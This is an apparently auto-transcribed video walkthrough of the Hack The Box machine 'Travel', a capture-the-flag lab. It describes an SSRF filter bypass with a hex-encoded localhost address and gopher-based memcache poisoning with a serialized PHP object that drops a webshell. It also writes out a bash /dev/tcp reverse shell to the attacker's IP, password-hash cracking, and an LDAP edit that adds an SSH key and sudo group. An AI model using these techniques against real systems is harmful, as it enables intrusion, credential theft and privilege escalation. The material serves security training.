 what's going on youtube this is ipsec we're doing travel from hack the box which was an extremely tough box but probably one of my favorite ones because the initial foothold was just really fun to do unfortunately that initial foothold is going to be pretty hard to explain because it's a relatively long exploit path and you have to look through a lot of php source code to figure out exactly how to trigger it it's a server-side request forgery that you can use the gopher protocol to access memcache which is listening on the local host to send a poisoned object and that poison object is just a php serialized object so you can create one that drops a file on the web server and then just call that to get code execution the main tough part about this is just figuring out how the application which is wordpress using a plugin called simplepie actually uses that memcache thing to pull back pages um hopefully it makes more sense once we go into the box so let's just jump in as always i'm going to start with the nmap so dash sc for default scripts sv enumerate versions oh a i'll put all formats put in the nmap directory call it travel and then the ip address which is 10 10 10 189 this can take some time to run so i've already ran it looking at the results we have just three ports open the first one being ssh on port 22 then we have http on port 80 and then https on 443. both http and https are running engine x version 1.17.6 however the https has a few more nmap scripts that go off one of which being the ssl-cert script telling us the common name for this web server is www.travel.htb and then it's also got a few alternative names such as blog.travel.htb and blog dev.travel.htb so let's go and add these over to a host file so i'm going to do sudo vi etsy hosts and then we'll just add 10 1010 189 blog dev travel.hdb blog.travel.htb dub www.travel.htb and just plain old travel.htb so we have quite a few websites that we'll want to enumerate so i'm going to save the host file and then we'll hop over in firefox and check out each of those domains so travel.htb and we get a page i'm going to try https as well and see what we get here and accept the risk and continue and it looks like um https just has an error and says uh use non-ssl websites if you wanted to look at the ssl script you could just click on the little lock and go to view certificate and well firefox has definitely changed how they display this um what's alternative name dub dub dub here we go here's the alt names but yep it's weird how it's displayed but you can see exactly what nmap pulled that way so let's just go over to travel.hdb and we're going to take a look at the other ones so there was a dub dub dub and i copied http so let's get rid of that uh blog.travel.htb and blog dev.travel.hdb uh these two look like the same exact page i'm going to press ctrl u to view the source to see if i can see exactly what this is uh template name don't see that much information here uh that we can try like slash index.html we get a page index.php not found so i'm guessing travel.htb is some type of static site that is going to be announced soon so i'm going to ignore that one we do have blog so i'm going to press ctrl u and let's see what do we have i see wp-include and wp-content so we know this is going to be a wordpress blog i'm going to start a wp scan off in the background and then we'll poke around a little bit so wp scan dash h and that will give us the help so we can look at all the options we will want to do dash dash url so wp scan dash dash url http blog.travel.htb okay so while that is running we can take a look at the post there is a travel blog post but looks pretty empty uh we can see the author is admin so that's the user that made this post and there's not really much else to do with wordpress looking at the results of wp scan doesn't look like anything too interesting so i'm going to go take a look at blog dev and see what we have here so we can do slash robots.txt to see if that exists we get a 404 not found interesting enough slash is just for three forbidden so it looks like it doesn't support listing um files if it's just an open directory so we can try to do a go buster and um i'm going to cheat a little bit normally i'd run the same one i always do like directory list 23 medium but it's actually missing the directory.get and that's the directory we need so maybe it's a good thing we change using that word list off default and switch to raft which is out of the set list so i'm going to do go buster dash u hdp blog dev dot travel dot htb dash w forward list opt set list and then discovery web content then we got a bunch of ones here i'm going to do raft large and we'll do i guess files dot text and see what we get here we have to do go buster in dir mode and i guess we can also run the same exact thing but we'll do it on the directories so raft large directories no as i was going to do that we have the hit of dot get so that is the directory we wanted to get if we go into this we can still see it's 4 3 forbidden but if we access the directory that doesn't exist we can see it's going to be a 404 so you could try going to like let's do it with curl curl get one of the default files is always config and you can see we can access the files if we know the name there is a tool called um get dump i think yep get dumper there's probably a lot of these tools but this is the tool we're going to be using so i think i have it here and i'm just going to install all the requirements if you didn't have that we can delete it and redo it so we can do git clone and then just paste that url so let's go in here we can do pip 3 install dash r requirements.txt and then we'll execute get dumper and what this does is um actually does it have a proxy option we can just proxy it it does sweet um let's try that so let's do dash u htp blog dash dev dot travel dot htb dash dash proxy http localhost 8080. and then the output directory will do hdb travel blog dev and let's go over to brip suite proxy intercept is on let's see doesn't want dash u for url and it looks like this is working so i'm going to turn this off and we're just going to look at the http history of what this does if you look here you can see it fetched everything but how's it figure out all the files well let's just sort by new we look at git head it's going to point us to refs headmaster which tells us we're on the master branch and then head is going to be the commit we are on so the code right after grabbing this is going to grab a bunch of default files however once we get over to like this after all those get log head so here's the latest commit there's the hash of the commit just looking for refs head master again same exact hash as we saw in the log but after it pulls this this helps it identify where all the other objects are we're getting a bunch of 404 is not found but if we look at the filter it's hiding css image and binary content so let's add everything in burp suite and we can see it's now downloading a few things and here are the actual files of the git object so if we go back into the directory we had put it in so you can do cd alt period to cycle through the last argument and these are the files out of that get i'm going to do git log and we can see that's just the one so there's no other commits here let's take a look over at the readme we can see the setup is get clone copy rss template dot php and template.php to wp content themes 2020 and then create a logs directory and then create the page in the backend and choose rss template as theme they've disabled cache additional security checks and they need to finish the logging implementation so not really sure what we have here except the only thing we can be paused about is the directory this is in so let's go test that out real quick so if we go to um blog dab travel we can try this and it's probably going to be what's the file name we look at it rss underscore template dot php not found uh we probably got not found here not 403 so let's try going back to the blog so getting out of dev and going here looks like that may be a directory slash log path not found logs with s and forbidden so we know exactly where we are we can probably find template.php if we wanted so let's take a look at the source code to see if it shows us anything so i'm going to do grep and it's all php so i'm going to search for system exact shell select and serial just some key things i want to search for first and the only hit we get is shell and exec and that is in template.php and just looking at this we have shell exec pl so this looks very good for us so let's do vim on template dot php go to shell exec and see what we have so this function url get contents it's gonna call safe on url and save is looking like it's preventing us from using file or at and it's saying hacking that prevented lfi and it also doesn't want us to use localhost so localhost or 12701 so let's see i'm in v already so i'm just going to put a comment i guess prevent ssrf attacks on localhost and then let's see escape shell ergs so this is going to prevent us from just like um putting semicolon command that's doing curl on your url and then shell exec return output so the main thing we want to do first is make sure we can get this function probably to call us because the dangerous function looks like it's shell exec so let's see if we can get it to make a request to us so i'm going to do grep url what was the name url get contents so grab url underscore get and that's in rss template so url underscore get contents let's see so template name awesome rss include template.php so let's go to blog.travel.htb awesome rss and then what argument do we give it is there any get so if is set get debug include debug.php let's see let's grab underscore get and we'll do a dash i to make this case insensitive and we can only include debug so i'm going to try question mark debug i guess we just do debug equals anything so test and i'm going to search this for debug and we can see something here a php serialized object and xct something so not exactly sure what this is doing but if we do this without debug we no longer see debug output so if i do now question mark debug i don't even need anything i can i just do that it's going to put this um we should be able to also just call the debug.php ourselves so we can probably do was it wp content themes 2020 and then maybe debug.php and we can so i'm going to send this over to burp suite i'm just going to make note of it so proxy intercept turn it on refresh send it to repeater i'm going to double click 1 and put debug and that just gives us that pretty so the next thing we want to do is figure out how to make the web server get access curl back to us because if it can maybe we can change what um this is outputting or this object so let's go back here and let's see get feed url instead of get i'm just gonna do dollar underscore maybe there was a post or request and while i don't see those i do see server so let's go open up this code and take a look at server so going here search for server and we can see url is equal to that and then we're checking if url contains custom feed url and if it does let's see it's going to set that variable else the variable is equal to custom feed.xml so let's cat this so i can easily copy from it grab custom b2 and i'm just going to grab this actually i just want this path i'm going to grab and just look at where this is c404 not found maybe it's here see i'm not sure exactly where this news feed is oh www.travel.htb so we can dub dub dub and we get the news feed okay so newsfeed and i could just do dub dub dub here i didn't have to edit this because blog.travel.htb and dub dub dub is actually going to the same host but if you wanted to go to a different web server altogether you have to make sure to configure the target details up to the top right so that's the news feed let's go create a new thing and we're going to try um was it awesome dash rss is that a page it is so it was custom url uh custom underscore feed url and then equals http 10 10 14 my ips.3 slash please subscribe okay so i'm going to make the dub dub dub and i'm going to touch please subscribe actually let's echo thank you to that file okay and python-m http.server we do it with sudo we can listen on port 80. uh python3 there we go send the get request we get the page and go here i don't see anything i'm going to rename this debug this will be ssrf so we don't see any options here if we just grabbed this with awesome rss i think is that what we did before so if we just grab this and then hit debug we actually get something but if we do it with our server side request forgery and hit debug this may just have to wait a little bit to go away but yeah so that's weird so let's go take a look at the code and see exactly what that is doing so let's go back to blog dev and then vi rss template and let's see if url simple pi set cache location it's doing memcache to local host and prefix xct underscore and we're looking here here's the prefix xct underscore and then it's got some characters set feed url init and then error dial so let's see i'm going to try something real quick let's go back to burp suite go to news feed copy curl command and let's go into dub dub dub curl dash o please subscribe so if we can't please subscribe uh do not do it two please subscribe so if we can now cat please subscribe we have the file i'm just gonna get rid of the header so now please subscribe and news feed should be the same exact file so let's do sudo python 3 m http server port 80. let's hit debug there's nothing there let's do a service side request for you to pull please subscribe and then hit debug nothing is there still i'm going to move please subscribe to please subscribe dot xml or try it again so please subscribe dot xml hits it and we get this so the main difference i'm not sure if you noticed but this um 8e45 changed if we just get it on i think it's this one here awesome rss it becomes 45 if we get it with our server side request forgery it becomes 8e something we can also let's try moving please subscribe to thanks.xml and we will grab that so go to debug and we have yet a third one bed b something so based upon knowing it's memcache and memcache is essentially a caching engine for just dynamic content so if the server ran the query before it throws it into memcache so we can just pull it from memcache instead of running the query again to speed up the server so if we look at this we got memcache right here so what i'm guessing is this is some page identifier to identify what page you are on or what the feed is so let's google to see exactly what simple pi is so php simple pi and then let's just turn intercept off and it's a super fast easy to use rss and atom feed so we're probably caching simple pi objects inside of memcache and that is going to be probably the feed so this dot dot dot is saying there's more data i'm guessing this whole php object is going to be the entire xml feed if i had to make a guess and we can see after a while the things go away so the main thing we want to look at right now is um this simple pi application see if there's a vulnerability in simple pi itself so let's go over to uh actually i think we are what we want so class dash simplepi.php is what i want to search for so let's look at this file so simple pi.php see this looks like it's going to be kind of a man page uh wordpress i'm just gonna put github on my search or i don't have to because i see github right there so now we got the simple pi class so we are doing probably set feed url we want to look at so what set feed url please use set feed here we go and this doesn't look like it's what we want so let's go to the very top of this and actually let's see if i can pull this down real quick and then we can open up like visual studio code so let's do get clone wordpress it looks like it's going relatively fast um i'm going to do i think alt f2 vs codium let's open this up file open folder let's get away from fatty go to travel blog dev wordpress okay so it was where were we we're in wp includes so wp includes class simple so class dash very simple simple pie this is where we are download update later so it's pulling a bunch of other files so i'm going to go into the probably simple pie directory and see what we have so let's go simple pi cache and i'm going to do memcache.php because that's what we're using is memcache so scrolling down here this is us creating the object and we can see it's doing md5 name and type so this is probably going to be the key so if we look into repeater it's probably going to be this and before the prefix so this is probably xct and this is this it's probably an md5 sum but it's being truncated so this is probably where we want to be we can scroll down and we can also verify that the um simple pi plugin is just going to unserialize data and i'm guessing that's going to be this so there's going to be a few things we have to do we have to figure out exactly how this page is created because these objects will only be triggered on the page they are we suspect that it's related to this where is it md5 type thing so to figure out what type is and then once we're here we can put a php object to be deserialized and try to get code execution on the server so we'll worry about this object later let's try to figure out how to name our php objects so let's see name type let's go to um the class again see open editors i don't have it open so class dash simple pie see do i have it open i don't know why it's not keeping it open but okay so this is where we are let's do i'm just looking for the url feed and i think this is the function where it's going to do that and we can see the url is right here and spc is going to be the type so let's go and do echo and the url we were getting is this so let's do echo this colon spc md5 sum and it should be equal to uh where is it that so we just get on awesome rss all right awesome dash rss gen cookie i guess uh gen cache so we needed equal 4e something and we're at 7 3 so that's not it let's try http www.travel.htb and that's not it either so let's go back in the code and we have to figure out exactly what the url is so it's calling get handler and can we find or edit find in files get handler right here explode that that doesn't look like it's going to be too helpful see this cache location we can look at cache name function and we see cache name function is md5 so my assumption right now is it's going to do an md5 sum on the url then that md5 sum is going to be placed here this could be md5 colon spc and it's going to do another mp5 sum and we probably should always do echo dash n when we do this so let's do this md5 sum and then we can get rid of this and do it here as well and it looks like that's actually generating our md5 so we have 4 e5 1 6 4 e5 or 6 1 five six one yep so we have the hash so i'm gonna make dirt exploit cd exploit the notes page hash okay so the next thing we have to do is be able to put a poisoned cookie on so we have to be able to edit this if we go back to our server side request forgery um or let's go back to rss template we have to be able to hit this port this one one two one one port if we can hit this port we can put the cookies in however the thing that's stopping us from hitting that port is this safe function and template.php because it's preventing us from doing file and it's also preventing us from doing localhost if you go i think it's a holiday video we talk about different ways of encoding ip addresses one of those ways is hexadecimal you can also do decimal there's a bunch of ways to encode it but this is just one way to view an ip so if we ping 12701 we get that however we can convert this to hex so 127 in hex is seven f this is zero zero this is zero zero and this is zero one so we can also ping zero x seven f like that and it translates to localhost so we can put this in for the url so we can do like that and it'll um access it so let's go and do it for 10 10 10 14 3 so that will be a which is 10 so 10 10 that's two a's then e is 14 i think and then three would just be zero three so we did that conversion right so let's just verify that this works so let's get out of that uh where's my dub dub dub we can just go here sudo python3-m hdb server port 80 and we're replacing it with a a e three and we can see the server gets it so now we have a way to bypass the um localhost exclusion so this should be going to localhost let's just ping it real quick to be sure it is so we can also put one one two one one so now there's a bunch of other protocols we can use so file is blacklisted so we can't use that and the at sign is also blacklisted so we probably can't do ftp because you always do ftp um username at the address so we can't use that we could probably use gopher which is a super old protocol so you google like um orange sci protocol smuggle i think this is it yeah this is a really good presentation which we're going to be doing so was going to encapsulate pretty much an http packet inside of gopher which is just um yeah he'll explain it in this presentation i'd recommend watching it so let's go back to our thing and see what happens when we send this so hit send we're waiting and we don't really get anything back and that's because we're not using this protocol correctly so what we want to do is just search for the tool go furious i think github and this generates gopher links with potential exploits so let's go and grab this and we'll test it out so cd slash opt get clone that tool go into it run it we can do dash dash exploit php mem cache and let's just put the payload as please subscribe so it gives us this payload so let's just copy this go back to burp and then paste it after this and then click send and it's not getting a response back let's see custom feed url oh we have to do 0x cancel 0x hit send and then go to debug and we can see we have now poisoned memcache so we can actually put anything we want here so let's try something real quick so let's go and where is it by blog dev exploit cat notes let's put xct underscore this so let's go in this payload ssrf and actually before we do that let's show you exactly what this is so i'm going to do smart decode and we can get rid of that and we can see it's printing a line break and then set spider 4015 please subscribe 15 is going to be the i think buffer uh four is flags i forget what the other thing is but if you just google like set memcache and it'll show you the syntax let's see uh key variable to store flag let's see set data maybe there we go this is better so key the flags this is going to be that expiration time and bytes so expiration time zero means no uh delay so if we put this to like 999 it's probably going to last a lot longer than at zero and 15 is a length please subscribe is 15 characters long so what we're going to do is go back into repeater and we're going to change spider to xct underscore and a hash and before we do that i'm going to get awesome rss and this is 2700 bytes let's see what happens if we send this and get it again so we sent that we look at this xct and then here 2700 bytes i'm guessing it's probably because um something failed and reported yeah so i'm not sure exactly why that didn't work we'd have to look at logging on the php server but i'm guessing when this also awesome rss went to pull the page it noticed oh the page isn't valid xml so it just decided not to display anything so now that we have that we have to figure out how to put a payload here where please subscribe is and if we go back into the template there's a logging class that we can use as a deserialization payload so i'm going to do is copy this and if you don't understand php deserialization i created two videos that explain it pretty well so you can just go to ipsec.rocks and do php deserialization there's an advanced one and there's an intro so let's grab this the pwn.php paste and these two privates we're going to turn to public okay we don't need a wake-up call and we'll also want to do php like that so now we just have to do the exploit so payload is equal to new template helper and we'll call this please subscribe dot php and that's going to be file so string file right here and the next thing is the contents of that file so i'm going to do php system and then request please subscribe okay and we also need to escape that and i think that should be fine see i'm just taking a look at that looks good i can put a semicolon here just in case and then we want to echo serialize payload so this should give us the payload so php pwn.php uh if we create logs we can look at what it created php system that looks good so i'm going to run pawn again we're going to copy this object and then we're going to run it and go furious with exploit memcache paste this and it says we should all be set so let's try this and we'll have to rename spider because we have to put the page so let's go back to ssrf and i'm actually going to copy that copy this paste copy that down and replace the name so now we send this we go to debug and nothing happens so we screwed something up oh i don't have a space here so i knew i screwed something up because nothing was going into the response uh the request didn't end with space http so if you ever see erp doing that you probably did like ctrl n to highlight everything and deleted that http piece so do that go to debug we have this then if i hit this page it's 17426 which i think is much smaller i thought it was two something but let's try going and grabbing the uh file so we called it what please subscribe.php 404 not found so oh it's in logs 200 okay so that's definitely what we want so now we can just put please sub what i call it uh yeah please subscribe it's equal to who am i oh we have to change this over to a post request and we get dub dub dub data so now let's do a reverse shell so bash dash i devtcp 1010 14 3 9001 0 and 1. then we'll url encode it then we can exit nc lvmp 9001 let's do script shell.log and i am in blogdev so let's just go here make the logs script shell.log nclvnp9001 send the reverse shell and we didn't get a hit um my base64 encoded this how'd i do that still want to get a hit so what i'm going to do ctrl shift u to unurl encode it bash dash c and put the command in here now ctrl u we don't have a response back because we have a shell so i'm going to do python dash m or python dash c import pty pty dot spawn then bash python3 dash c import pty pty dot spawn been bash which python which python three we don't have python at all um let's see i'm gonna do script dash queue and then let's try stty raw minus echo fg looks like we are good so let's cat please subscribe oh tab does not work um ctrl c does but tab does not let's do bash cat please there we go so that now works let's test standard error and it looks like everything works so we just had to type bash after that our shell size is off so i'm going to do is it tty or st2y dash a and we can do stty dash a row 16 columns 136 modes may not be set oh i don't do dash a i just do stdy rows like that so row 16 columns 136 so now when i go all the way over it doesn't truncate like it was before the last thing i want to do is be able to clear the screen so i'm going to export term is equal to x term i thought that would have done it i don't think we do it like this do we clear oh export term in all caps is equal to x term there we go so now we have our um reverse shelf set up so let's go to cd slash do a ls and we see we're in docker environment if i do it ipaddr i can see my ip address is 172.30.0.10 so let's see let's go to home i'm guessing there's no home directory nope nothing there so normally when i'm in a docker i think of what type of doctor i'm in and then try to pillage data because going over the root of a doctor isn't really going to do that much so her concern isn't really escalating to root it is getting information to do lateral movement and since we're in the um blog docker i'm guessing we have to go into like the wordpress database so i'm going to go verb dub dub html and we can look at the wp-config dot php and we want to go for the username and password so database user is wp and the password is this so mysql dash u wp hit dash p paste in the password and we can do show databases use wp show tables and then we can do select or instead of select start let's do describe wp users we can do select user login user pass from wp underscore users and we get a username of admin and here's the password hash so let's go over to the kraken and we'll try cracking it so cd hash cat v hashes slash we'll call this actually travel paste it and then we'll do dot slash hash cat grab or before grab dash dash example hashes grep and we'll do like that i think and we can do dash b4 to do before four and it looks like that hash may be a php pass so mode 400 i'm just going to cat hash's travel real quick and it definitely looks like it is mode 400. so dot slash cat dash m 400 hashes travel opt word list rock you dot text and hash cat is starting so while that cracks we can take a look at other things so we got zero out of one recovered we could do rule files but generally in hack the box you're not gonna spend too much time trying to crack something and rolls just makes your dictionary bigger by doing a bunch of permutations to it so if we go into slash opt which is another common directory of putting files there is a wordpress file if we look at wordpress you have a backup.sql so if we cap this file there's a ton of text but right at the very bottom we see insert into wp users we got admin admin at travel link admin so we got a few more so let's go and cancel this crack v hashes slash travel and we're gonna put all of these so let's grab this paste and we'll do admin colon this is admin travel.htb oh i think this hashes that admin at travel.htb okay then the next one is going to be link admin paste delete this so it looks like there's only two hashes so we'll do that and do the same exact command except i'm going to do dash dash users because i included user names in the hash file or is it dash dash user no s and what that's going to do is it's going to just take the hash file and [Music] grab everything after the first colon and use that for the password the main benefit is your hash file stays organized with the username so when we do a dash dash show so we can get rid of the word list dash dash show to show cracked it remembers that username if we went into hash's travel and got rid of that colon and we just had hashes in this file then when we do dash shell it's not going to show us the user so it kind of just helps us stay a bit more organized so linux admin has the password of one step closer so what i'm going to do is we're going to try ssh and then into 10 10 10 189 which is travel yes and permission denied so let's try l y n where is it ik admin at that ip and it allows us to do a password so i'm going to paste the password and we get into the box so if we do ls-la uh there's a few files that normally aren't here um we got a ldap dot or dot ldap rc file so if i cap that file we see odap information and then we also have a vim info file so looking at vim info doesn't look like there's that much interesting thing except potentially bind pw the road less traveled and in ldap passwords are called like a bind password so this is most likely going to be the password we could just do now ldap search dash x for basic authentication dash w and then the bind password and we get a big ldap dump and it's using this dot ldap rsc file and putting the base and bind dn for us so i think the it would be like i think dash b dc equals travel dc equals hdb did i do this one right and then dash d would be bind dn if you want to do this locally but we don't really have to do that we can look at all this information in ldap search and potentially reset a password so linux admin oh we already knew his password that's the account we logged in at and nothing else really so we can do sudo l since we are an admin and it was one step closer is the password and we may not run sudo on traveler but one thing i really like doing with ldap is just opening up in some type of gui we could use ldap modify and modify a bunch of things that way but it's just not an intuitive thing to do through a command line so i'm going to google apache directory services i think yep this thing and i actually think it is this one the directory studio let's try this click it download for linux then sure save file and this could take a little while to download it's 100 megs and my download isn't going too fast so i'm going to fast forward the video and we'll resume once this is done downloading so it's now just finished downloading so let's unzip it and execute it so let's go mv downloads apache directory studio guitar zxvf do decompress it and then let's go into the directory and execute apache directory studio so before we can actually access ldap uh we're gonna have to do a port forward because ldap wasn't actually listening on the routable interface if we go back to our nmap and look at it so cd dot slash nmap less travel.nmap we only have 2280 and 443 open ldap is on port 389 which is only listening on localhost we go back to this netstat dash rn uh maybe sslnpt we can see uh it's not there and that's probably because it's etsy hosts and it's 172 20 0 10. are we yeah we're in the root host okay yep i was wondering if we're in another daca container but now it looks like we're on the root host because i didn't see that docker n file and i also have a bunch of interfaces so we have to forward port 389 to the host so cat dot ldap or c so what i'm going to do is if the very first command you enter in ssh is squiggly c it's going to drop you to a hidden prompt so i'm going to do enter squiggly c and then we can do dash l and i didn't run ssh with sudo so i can't open port 389 locally on my box because it's below 1024 any port below 1024 requires root to open that socket so i'm just going to do 0.9389 and anything on my box from port 9389 i'm going to redirect it to ldap.travel.htb on port 389 so now we can probably get out of this shell now i can do a ldap search dash x uh dash h localhost uh nine 389 and then we need dash b for the base dn this is going to be dc equals travel then dc equals hdb and dash d this is going to be who i'm binding as we'll do cn equals linux i'll just copy and paste this like that and we'll probably need dash w and put a password so cat dot vim info and we'll grab the road less traveled so now i can run ldap from my cali box or my parrot box so we can do file new ldap new connection connection name this can be travel localhost 9389. now we're not going to do any encryption find user let's grab this and bind password let's grab this and we can check authentication authentication was successful so we can do finish and we should be able to view ldap so i'm going to click this little tree icon and it will make this window bigger and we can go dc equals this and we can browse out out and you'll notice this is very much like um the active directory uses a computer's mmc console because that's essentially the same thing so we have our cn linux admin and we have user password and everything we also have this user ou so let's see if we can modify anything here uh let's see i'm going to play with the linux account so let's change the name to be ipsec and it looks like we did and you can see the command it ran here it specifies the full dn change type is modify replace cn with the cn of ipsec so if we were doing it through command line this is what we'd have to do so let's see if we can give it a password because we have a user password variable here so i'm going to right click new attribute we can do user password click next i guess we can just do finish and then it wants us to put a password so we'll do please subscribe i can type there we go click ok so we have now modified the password and that color is horrible but now let's try sq-ing to linux so s-u-l-y-n-i-k please subscribe and we get permission denied so let's try ssh ssh clinic at 10 10 10 189 and we just get permission denied right away so let's take a look at that ssh config if we can so etsy ssh d maybe just ssh then cat shd underscore config and we see enable password access for admins in case certificate fails and we allow travel admin and linux admin access so nothing there d nothing in that so we have to use ssh keys and if we google around ldap linux ssh key it does allow you to use it um the easiest way to do it would just be right click new attribute and let's do [Music] ssh public key a public key for this schema is not allowed okay so we have to create the object class ldap password because we don't have it here so new attribute object class and then let's add ldap public key it was out at public keynote all that password so add that so now we have this object class in a user which is going to enable us to do ssh public key and edit as text let's generate a key so let's go here ssh keygen dash f l y n ik cat linux dot pub we can copy the ssh key it in click ok and now we sent it so now we can do ssh lyn ik at 10 10 10 189 and we've specified the key so dash f linux like that uh is it dash i i think it's dash i for key yep there we go so now we're in the box we can do sudo l please subscribe is the password we set for this user and it says he may not run sudo on this box if we look at the groups we're a member of domain users and we can't etsy group grep domain user as it groups grep dash i oh because it's in ldap it's not in past wd um it's group 5000 so we could change this group to be something else so if we look at group we can do sudo or we can do root let's try root real quick let's try setting this to gid equals zero okay so we run groups we're domain user let's exit out go back in groups still domain user cd root mission denied so maybe there's something that prevents us from doing that group let's cat etsy group grepsudo 27 let's add ourselves to 27. exit go back in groups now a member of sudo and domain users so there's probably something on the box that prevented us from taking the root group but remembering a member of sudo we can do all so we can do sudo su dash and now we have rooted the box so that is it hope you guys enjoyed it take care and i will see you all next week